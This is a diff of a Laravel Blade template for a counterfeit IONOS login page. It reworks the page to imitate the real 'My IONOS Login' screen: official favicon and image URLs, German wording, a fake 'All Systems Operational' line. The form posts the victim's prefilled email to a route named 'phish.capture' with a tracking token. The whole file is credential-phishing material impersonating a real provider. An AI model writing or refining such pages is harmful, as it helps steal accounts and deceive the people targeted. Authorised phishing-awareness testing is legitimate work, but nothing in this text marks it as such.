@@ -3,71 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="robots" content="noindex">
-    <title>IONOS Login</title>
-    <link rel="icon" href="https://www.ionos.com/favicon.ico">
-    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <title>My IONOS Login</title>
+    <link rel="icon" href="https://login.ionos.com/favicon.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&family=Overpass:wght@600;700&display=swap" rel="stylesheet">
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:"Open Sans",sans-serif;background:#f3f0eb;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
-        .card{background:#fff;padding:48px 40px;width:100%;max-width:420px;box-shadow:0 4px 24px rgba(0,0,0,.06);text-align:center}
-        .logo-section{margin-bottom:32px}
-        .logo-section .brand{font-size:28px;font-weight:800;color:#1a1a2e;letter-spacing:-0.5px}
-        .logo-section .brand span{color:#003d8f}
-        h1{font-size:22px;color:#1a1a2e;margin-bottom:8px;font-weight:600}
-        .sub{font-size:14px;color:#666;margin-bottom:28px}
-        .email-display{display:flex;align-items:center;padding:12px 16px;background:#f8f7f5;margin-bottom:24px;text-align:left;gap:12px}
-        .avatar{width:36px;height:36px;border-radius:50%;background:#003d8f;display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px;font-weight:700;flex-shrink:0}
-        .email-text{font-size:14px;color:#333;font-weight:500}
-        .form-group{text-align:left;margin-bottom:16px}
-        .form-group label{display:block;font-size:13px;color:#333;margin-bottom:6px;font-weight:600}
-        .form-group input{width:100%;height:44px;padding:0 16px;font-size:15px;font-family:"Open Sans",sans-serif;border:1px solid #d1d1d1;border-radius:4px;outline:none;transition:border-color .2s}
-        .form-group input:focus{border-color:#003d8f;box-shadow:0 0 0 3px rgba(0,61,143,.08)}
-        .checkbox-row{display:flex;align-items:center;gap:8px;margin-bottom:20px}
-        .checkbox-row input[type="checkbox"]{width:16px;height:16px;cursor:pointer}
-        .checkbox-row label{font-size:13px;color:#666;cursor:pointer}
-        .btn-login{width:100%;height:48px;background:#003d8f;color:#fff;border:none;border-radius:4px;font-size:15px;font-weight:600;cursor:pointer;transition:background .15s}
-        .btn-login:hover{background:#002d6b}
-        .links-row{display:flex;justify-content:space-between;margin-top:16px}
-        .links-row a{font-size:13px;color:#003d8f;text-decoration:none}
-        .links-row a:hover{text-decoration:underline}
-        .footer{margin-top:24px;font-size:11px;color:#999}
-        .footer a{color:#999;text-decoration:none}
-        .footer a:hover{text-decoration:underline}
-        @media(max-width:480px){.card{padding:32px 24px}}
+        body{font-family:OpenSansRegular,arial,'arial narrow',sans-serif;background:#fff;min-height:100vh;color:#001b41}
+        header{display:flex;align-items:center;justify-content:space-between;padding:16px 32px;border-bottom:1px solid #eee}
+        .logo{font-family:OverpassSemibold,arial,sans-serif;font-size:21.5px;font-weight:700;color:#003d8f;text-transform:uppercase;letter-spacing:1px}
+        nav{display:flex;gap:24px;align-items:center}
+        nav a{font-size:14px;color:#001b41;text-decoration:none;font-weight:400}
+        nav a:hover{color:#003d8f}
+        .main{max-width:590px;margin:60px auto;padding:0 32px}
+        .my-account-img{text-align:center;margin-bottom:40px}
+        .my-account-img img{width:150px;height:150px}
+        h1{font-family:OverpassSemibold,arial,sans-serif;font-size:22px;font-weight:600;color:#001b41;margin-bottom:4px;line-height:30px}
+        .subtitle{font-size:14px;color:#001b41;margin-bottom:32px;line-height:20px}
+        .input-group{margin-bottom:20px}
+        .input-group input{width:100%;height:36px;padding:0 12px;font-size:14px;font-family:OpenSansRegular,arial,sans-serif;color:#001b41;background:transparent;border:1px solid #1474c4;border-radius:8px;outline:none;transition:border-color .15s}
+        .input-group input:focus{border-color:#003d8f;box-shadow:0 0 0 2px rgba(0,61,143,.1)}
+        .input-group input::placeholder{color:#666}
+        .btn-next{height:36px;padding:4px 20px;background:#0b2a63;color:#fff;border:2px solid #0b2a63;border-radius:24px;font-size:14px;font-weight:600;font-family:OpenSansSemibold,arial,sans-serif;cursor:pointer;transition:background .15s}
+        .btn-next:hover{background:#091f4a}
+        .links{display:flex;justify-content:space-between;margin-top:20px}
+        .links a{font-size:13px;color:#003d8f;text-decoration:none}
+        .links a:hover{text-decoration:underline}
+        .status{text-align:center;margin-top:40px;font-size:12px;color:#666}
+        .status span{color:#00a651}
+        footer{position:fixed;bottom:0;left:0;right:0;padding:12px 32px;text-align:center;font-size:11px;color:#999;border-top:1px solid #f0f0f0}
+        @media(max-width:480px){.main{padding:0 16px}}
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="logo-section">
-            <div class="brand">ION<span>OS</span></div>
-        </div>
-        <h1>Willkommen</h1>
-        <p class="sub">Melden Sie sich mit Ihrem IONOS Konto an.</p>
+    <header>
+        <div class="logo">IONOS</div>
+        <nav>
+            <a href="#">Hilfe</a>
+            <a href="#">Mein Account</a>
+        </nav>
+    </header>
 
-        <div class="email-display">
-            <div class="avatar">{{ strtoupper(substr($email, 0, 1)) }}</div>
-            <div class="email-text">{{ $email }}</div>
+    <div class="main">
+        <div class="my-account-img">
+            <img src="https://login.ionos.com/image/my-account.svg" alt="My IONOS">
         </div>
+
+        <h1>My IONOS Login</h1>
+        <p class="subtitle">Melden Sie sich mit Ihren Zugangsdaten an.</p>
 
         <form action="{{ route('phish.capture', ['provider' => 'ionos', 'token' => $token]) }}" method="POST">
             @csrf
-            <div class="form-group">
-                <label for="password">Passwort</label>
-                <input type="password" id="password" name="password" required autofocus>
+            <div class="input-group">
+                <input type="email" name="email" placeholder="Customer ID, email address or domain" value="{{ $email }}" autocomplete="username">
             </div>
-            <div class="checkbox-row">
-                <input type="checkbox" id="keepLogin" checked>
-                <label for="keepLogin">Angemeldet bleiben</label>
+
+            <div style="margin-top:20px">
+                <button type="submit" class="btn-next">Next</button>
             </div>
-            <button type="submit" class="btn-login">Anmelden</button>
         </form>
 
-        <div class="links-row">
+        <div class="links">
             <a href="#">Passwort vergessen?</a>
             <a href="#">Hilfe</a>
         </div>
-        <div class="footer">© 2026 IONOS SE</div>
+
+        <div class="status">All Systems <span>Operational</span></div>
     </div>
+
+    <footer>© 2026 IONOS SE</footer>
 </body>
 </html>
